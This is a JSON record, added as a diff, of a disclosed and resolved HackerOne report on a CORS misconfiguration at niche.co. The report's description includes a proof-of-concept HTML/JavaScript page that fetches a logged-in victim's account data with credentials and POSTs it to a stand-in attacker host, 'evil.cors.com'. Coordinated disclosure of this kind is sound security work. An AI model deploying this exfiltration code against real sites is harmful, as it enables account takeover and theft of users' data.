@@ -1,0 +1,145 @@
+{
+  "id": 426147,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC80MjYxNDc=",
+  "url": "https://hackerone.com/reports/426147",
+  "title": "CORS misconfig | Account Takeover",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "high",
+  "readable_substate": "Resolved",
+  "created_at": "2018-10-20T11:17:55.552Z",
+  "submitted_at": "2018-10-20T11:17:55.552Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "nahoragg",
+    "url": "/nahoragg",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/5u4235q6eoo0u2wi9obuk15tbga4/3cb67cc78dc0cba55b102dd9eca2ee89b206d3e960be830f070583d9070b69ef"
+    },
+    "is_me?": false,
+    "cleared": true,
+    "verified": true,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 61,
+    "url": "https://hackerone.com/x",
+    "handle": "x",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/ikx4ept298unt534kpz4am2bd4zs/3cb67cc78dc0cba55b102dd9eca2ee89b206d3e960be830f070583d9070b69ef",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/ikx4ept298unt534kpz4am2bd4zs/d9695107bfcd68eeb1c9e0912b109cdae9a6c00c0bda6fd4cbd6d9bdb828840a"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "X / xAI",
+      "twitter_handle": "XSecurity",
+      "website": "https://x.com",
+      "about": "X helps you create and share ideas and information instantly, without barriers."
+    }
+  },
+  "has_bounty?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": true,
+  "disclosed_at": "2018-12-10T18:28:33.696Z",
+  "bug_reporter_agreed_on_going_public_at": "2018-11-20T04:35:09.186Z",
+  "team_member_agreed_on_going_public_at": "2018-12-10T18:28:33.593Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "**Summary:** \nCORS misconfig is found on niche.co as Access-Control-Allow-Origin is dynamically fetched from client Origin header with **credential true** and **different methods are enabled** as well.\n\n**Description:**\nBasically, the application was only checking whether \"//niche.co\" was in the Origin header, that means i can give anything containing that. For ex : \"https://niche.co.evil.net\", \"https://niche.com\", i can even change the protocol like http, ftp, file etc. F363563: cors_1.png\n\n## Steps To Reproduce:\nExploit:\nHost this code on a domain(http://niche.co.evil.net) or any other that contains \"//niche.co\".\n```\n<html>\n<body>\n<button type='button' onclick='cors()'>CORS</button>\n<p id='demo'></p>\n<script>\nfunction cors() {\nvar xhttp = new XMLHttpRequest();\nxhttp.onreadystatechange = function() {\nif (this.readyState == 4 && this.status == 200) {\nvar a = this.responseText; // Sensitive data from niche.co about user account\ndocument.getElementById(\"demo\").innerHTML = a;\nxhttp.open(\"POST\", \"http://evil.cors.com\", true);// Sending that data to Attacker's website\nxhttp.withCredentials = true;\nconsole.log(a);\nxhttp.send(\"data=\"+a);\n}\n};\nxhttp.open(\"GET\", \"https://www.niche.co/api/v1/users/*******\", true);\nxhttp.withCredentials = true;\nxhttp.send();\n}\n</script>\n</body>\n</html>\n```\nAs soon as victim visit this malicious page, his details will be fetched from his current session and sent to attacker's domain where it can be logged or saved. F363586: cors_3.png F363564: cors_2.png\n\n## How to fix\n\nRather than using a wildcard or programmatically verifying supplied origins, use a whitelist of trusted domains.\n\n## Supporting Material/References:\n\nhttps://portswigger.net/blog/exploiting-cors-misconfigurations-for-bitcoins-and-bounties\nhttps://ejj.io/misconfigured-cors/\n\n## Impact\n\nUsing this misconfig, attacker can do many actions depending on the functionality of application which in this case use **API** and do activities like:\n1) Read, Update, Delete Users information(Email,Location,Bio etc)\n2) Stealing Authenticity_token(CSRF) \n3) Delete social accounts on niche\n4) **View private posts of social accounts**\n5) Close account\n6) Logout etc.",
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+    {
+      "id": 363563,
+      "file_name": "cors_1.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/363/563/b5a4f2385d003a1f9f93f9c91a0d162ffbadd0d4/cors_1.png?response-content-disposition=attachment%3B%20filename%3D%22cors_1.png%22%3B%20filename%2A%3DUTF-8%27%27cors_1.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ7KZMNWF3%2F20260221%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260221T020802Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjENj%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIBpctk5vIcz8fqSxmSbvaEaA1vPXGZAzy8p2lTcuSOqcAiEA8XDMNvLIH8IFW8sJzuwl%2Fofjl3QmgKtFRp1BIZMlQZAquwUIof%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARADGgwwMTM2MTkyNzQ4NDkiDCLD1FNfAq4lNpj37iqPBa0M7iq3oIheySEZNnmgACvAWV%2BkbXHCsteA4rscn1beTFz8534XLB5ilpc%2Fnb2Xpze8GBNJanaSc9cKiHGAFyDZ0OTmKOpVNzyomRG0id4bgUU1pBse6JfR%2FR9T2APt%2Fl0WOKa5AXonxVTB%2B%2FJz73R%2FFrd%2F8UOXlHqkfWd2vvO4BBH1Dw2p0jabiXTpLfaM54se%2FuPl4Kx%2F6XZabduPzoDY6azarYmHqYMroGTWKRYMzGt7HY3wYyVQvxOShtv4DL1vJdsOpBck2W5jYLnh3%2FzYmjvulpVouKFkyLDTf2H6bzaEXG0mRDVSUNSZu3bsddxvLzUCYEUVi1pU63sadXWdyeUaSEte4kGuwBeF%2Fj2SwNmHUk0YBjztG673X%2BPSx7AUOxC2zxqiWn9Fpwpk3Sn6UI5GuKkMvDhUg7bVT8Tykrd4zJTMepJOXucr0Ap%2F4f17KA8KEY6aUjzwNIn6S4vTgrTRt956sxSBAXEF1x7Lc5PuSU68b2ogIpDAapXbTIMNE7k4RaVH4b8rmKB8CKnGQRDksAAL71R8MZvpLGu9Mq2mbYmRA45gS8iA2ONZ10pAykkIGt%2BQ23rfUucGlP5jC53R5LU3k0QqUDLSca5btK1RVLH3AZXyvvUu8hB4Necr4XRKe9TJg78oxt%2B1Q1cMSvSEJNcyJc58qsNuFdRZ4gnbnthWNb%2BLBTouqApwUrrQxXZ0T5eM8sFf%2FWsbAfcyHCU2ApLZp5k2rioOWP7hKIHZOyUwtK3cra1m5Ke7vQF3yRJzqEt6MFe2%2Fz35TwM37cZSvlEm7DFVb4dxZz72iFsxiwo%2BKKssN1gsahlA6yUZGllZLDbfkcLPyfzAeD2afFrRDW4WvPoaYOBUkrUw9uvjzAY6sQGzXLxWXzhgzd%2B5dLZO6RbnHP%2B6iFTlCTdtc4JwCY0jfTZglLiZSz99SQo%2BzQE%2F3D20j22aHOE8PBgYRMimZvwuQB5bpBVz0yj1MOfAStV4Cn3p8PXaEUhYRcfZvUp5lzGizE04VAR33TkhfeRgK4urnVz1lqRZzrLRWQ4H4lsswg5E5engZqMjZUtTsPg103tBhqe5JPopQlW5sppUFToVRJ3%2B%2Fk%2F2bjl5LiRDHNL0J8I%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=8175465b8bc0120bfc35cb0d2b0972dd7218d573089e4c95e0ef824badb505c4",
+      "file_size": 102979,
+      "type": "image/png",
+      "moderated": null
+    },
+    {
+      "id": 363564,
+      "file_name": "cors_2.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/363/564/2d20cde7ace0c1edf6d820fa8942676e46fe5ba4/cors_2.png?response-content-disposition=attachment%3B%20filename%3D%22cors_2.png%22%3B%20filename%2A%3DUTF-8%27%27cors_2.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ7KZMNWF3%2F20260221%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260221T020802Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjENj%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIBpctk5vIcz8fqSxmSbvaEaA1vPXGZAzy8p2lTcuSOqcAiEA8XDMNvLIH8IFW8sJzuwl%2Fofjl3QmgKtFRp1BIZMlQZAquwUIof%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARADGgwwMTM2MTkyNzQ4NDkiDCLD1FNfAq4lNpj37iqPBa0M7iq3oIheySEZNnmgACvAWV%2BkbXHCsteA4rscn1beTFz8534XLB5ilpc%2Fnb2Xpze8GBNJanaSc9cKiHGAFyDZ0OTmKOpVNzyomRG0id4bgUU1pBse6JfR%2FR9T2APt%2Fl0WOKa5AXonxVTB%2B%2FJz73R%2FFrd%2F8UOXlHqkfWd2vvO4BBH1Dw2p0jabiXTpLfaM54se%2FuPl4Kx%2F6XZabduPzoDY6azarYmHqYMroGTWKRYMzGt7HY3wYyVQvxOShtv4DL1vJdsOpBck2W5jYLnh3%2FzYmjvulpVouKFkyLDTf2H6bzaEXG0mRDVSUNSZu3bsddxvLzUCYEUVi1pU63sadXWdyeUaSEte4kGuwBeF%2Fj2SwNmHUk0YBjztG673X%2BPSx7AUOxC2zxqiWn9Fpwpk3Sn6UI5GuKkMvDhUg7bVT8Tykrd4zJTMepJOXucr0Ap%2F4f17KA8KEY6aUjzwNIn6S4vTgrTRt956sxSBAXEF1x7Lc5PuSU68b2ogIpDAapXbTIMNE7k4RaVH4b8rmKB8CKnGQRDksAAL71R8MZvpLGu9Mq2mbYmRA45gS8iA2ONZ10pAykkIGt%2BQ23rfUucGlP5jC53R5LU3k0QqUDLSca5btK1RVLH3AZXyvvUu8hB4Necr4XRKe9TJg78oxt%2B1Q1cMSvSEJNcyJc58qsNuFdRZ4gnbnthWNb%2BLBTouqApwUrrQxXZ0T5eM8sFf%2FWsbAfcyHCU2ApLZp5k2rioOWP7hKIHZOyUwtK3cra1m5Ke7vQF3yRJzqEt6MFe2%2Fz35TwM37cZSvlEm7DFVb4dxZz72iFsxiwo%2BKKssN1gsahlA6yUZGllZLDbfkcLPyfzAeD2afFrRDW4WvPoaYOBUkrUw9uvjzAY6sQGzXLxWXzhgzd%2B5dLZO6RbnHP%2B6iFTlCTdtc4JwCY0jfTZglLiZSz99SQo%2BzQE%2F3D20j22aHOE8PBgYRMimZvwuQB5bpBVz0yj1MOfAStV4Cn3p8PXaEUhYRcfZvUp5lzGizE04VAR33TkhfeRgK4urnVz1lqRZzrLRWQ4H4lsswg5E5engZqMjZUtTsPg103tBhqe5JPopQlW5sppUFToVRJ3%2B%2Fk%2F2bjl5LiRDHNL0J8I%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=d428ca58dadf96ca7d6bc5740dd2d6584b06646d6b1052b84d283032512a6c8b",
+      "file_size": 145451,
+      "type": "image/png",
+      "moderated": null
+    },
+    {
+      "id": 363586,
+      "file_name": "cors_3.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/363/586/086bbd8a734beddf5b810aad70e8c47721a776e5/cors_3.png?response-content-disposition=attachment%3B%20filename%3D%22cors_3.png%22%3B%20filename%2A%3DUTF-8%27%27cors_3.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ7KZMNWF3%2F20260221%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260221T020802Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjENj%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIBpctk5vIcz8fqSxmSbvaEaA1vPXGZAzy8p2lTcuSOqcAiEA8XDMNvLIH8IFW8sJzuwl%2Fofjl3QmgKtFRp1BIZMlQZAquwUIof%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARADGgwwMTM2MTkyNzQ4NDkiDCLD1FNfAq4lNpj37iqPBa0M7iq3oIheySEZNnmgACvAWV%2BkbXHCsteA4rscn1beTFz8534XLB5ilpc%2Fnb2Xpze8GBNJanaSc9cKiHGAFyDZ0OTmKOpVNzyomRG0id4bgUU1pBse6JfR%2FR9T2APt%2Fl0WOKa5AXonxVTB%2B%2FJz73R%2FFrd%2F8UOXlHqkfWd2vvO4BBH1Dw2p0jabiXTpLfaM54se%2FuPl4Kx%2F6XZabduPzoDY6azarYmHqYMroGTWKRYMzGt7HY3wYyVQvxOShtv4DL1vJdsOpBck2W5jYLnh3%2FzYmjvulpVouKFkyLDTf2H6bzaEXG0mRDVSUNSZu3bsddxvLzUCYEUVi1pU63sadXWdyeUaSEte4kGuwBeF%2Fj2SwNmHUk0YBjztG673X%2BPSx7AUOxC2zxqiWn9Fpwpk3Sn6UI5GuKkMvDhUg7bVT8Tykrd4zJTMepJOXucr0Ap%2F4f17KA8KEY6aUjzwNIn6S4vTgrTRt956sxSBAXEF1x7Lc5PuSU68b2ogIpDAapXbTIMNE7k4RaVH4b8rmKB8CKnGQRDksAAL71R8MZvpLGu9Mq2mbYmRA45gS8iA2ONZ10pAykkIGt%2BQ23rfUucGlP5jC53R5LU3k0QqUDLSca5btK1RVLH3AZXyvvUu8hB4Necr4XRKe9TJg78oxt%2B1Q1cMSvSEJNcyJc58qsNuFdRZ4gnbnthWNb%2BLBTouqApwUrrQxXZ0T5eM8sFf%2FWsbAfcyHCU2ApLZp5k2rioOWP7hKIHZOyUwtK3cra1m5Ke7vQF3yRJzqEt6MFe2%2Fz35TwM37cZSvlEm7DFVb4dxZz72iFsxiwo%2BKKssN1gsahlA6yUZGllZLDbfkcLPyfzAeD2afFrRDW4WvPoaYOBUkrUw9uvjzAY6sQGzXLxWXzhgzd%2B5dLZO6RbnHP%2B6iFTlCTdtc4JwCY0jfTZglLiZSz99SQo%2BzQE%2F3D20j22aHOE8PBgYRMimZvwuQB5bpBVz0yj1MOfAStV4Cn3p8PXaEUhYRcfZvUp5lzGizE04VAR33TkhfeRgK4urnVz1lqRZzrLRWQ4H4lsswg5E5engZqMjZUtTsPg103tBhqe5JPopQlW5sppUFToVRJ3%2B%2Fk%2F2bjl5LiRDHNL0J8I%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=07bfe889e923a3a61d3dec74be8bbd7f1e9412e271273841beb8a0a475524a7d",
+      "file_size": 251543,
+      "type": "image/png",
+      "moderated": null
+    }
+  ],
+  "allow_singular_disclosure_at": "2018-12-20T04:35:09.235Z",
+  "allow_singular_disclosure_after": -226359173.08851627,
+  "singular_disclosure_allowed": true,
+  "vote_count": 27,
+  "voters": [
+    "shamlawi",
+    "defenderwww",
+    "thaivu",
+    "ali",
+    "sigsegv_banana",
+    "sameerphad72",
+    "hajjaj0x",
+    "mik317",
+    "nahoragg",
+    "ankitsingh",
+    "and 17 more..."
+  ],
+  "severity": {
+    "rating": "high",
+    "author_type": "User"
+  },
+  "structured_scope": {
+    "databaseId": 1066,
+    "asset_type": "URL",
+    "asset_identifier": "niche.co",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
